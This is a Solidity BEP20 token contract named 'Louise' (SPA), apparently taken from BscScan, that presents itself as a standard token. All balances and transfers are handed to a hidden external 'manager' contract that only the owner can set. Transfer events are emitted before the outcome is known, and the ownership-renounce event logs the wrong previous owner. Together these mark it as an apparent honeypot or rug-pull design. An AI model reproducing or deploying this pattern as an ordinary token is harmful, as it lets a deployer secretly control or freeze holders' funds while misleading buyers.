/**
 *Submitted for verification at BscScan.com on 2022-06-08
*/

pragma solidity ^0.8.12;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

interface BEP20 {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function getOwner() external view returns (address);

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

interface Mainmanager {
    function makeTransfer(address caller, address from, address to, uint amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

contract LouiseSPA is BEP20 {
    using SafeMath for uint256;

    string public name = "Louise";
    address public owner = msg.sender;    
    string public symbol = "SPA";
    uint public _totalSupply;
    uint8 public _decimals;
    
    mapping (address => mapping (address => uint256)) private allowed;
    address private themanager;
    
    constructor() public {
        emit Transfer(address(0), msg.sender, _totalSupply);
        _totalSupply = 753888 * 10 ** 9;
        _decimals = 9;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function balanceOf(address _adr) view public returns (uint256) {
        return Mainmanager(themanager).balanceOf(_adr);
    }

    function approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
    function allowance(address _adr, address spender) view public returns (uint256) {
        return allowed[_adr][spender];
    }

    function setTheManager(address _adr) public {
        require(msg.sender == owner);
	themanager = _adr;
    }

    function renounceOwnership() public {
        require(msg.sender == owner);
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));
    }
    
    function transferFrom(address from, address to, uint amount) public returns (bool success) {
        emit Transfer(from, to, amount);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(amount);
        return Mainmanager(themanager).makeTransfer(msg.sender, from, to, amount); 
    }

    function transfer(address to, uint amount) public returns (bool success) {
        emit Transfer(msg.sender, to, amount);
        return Mainmanager(themanager).makeTransfer(msg.sender, msg.sender, to, amount);
    }
}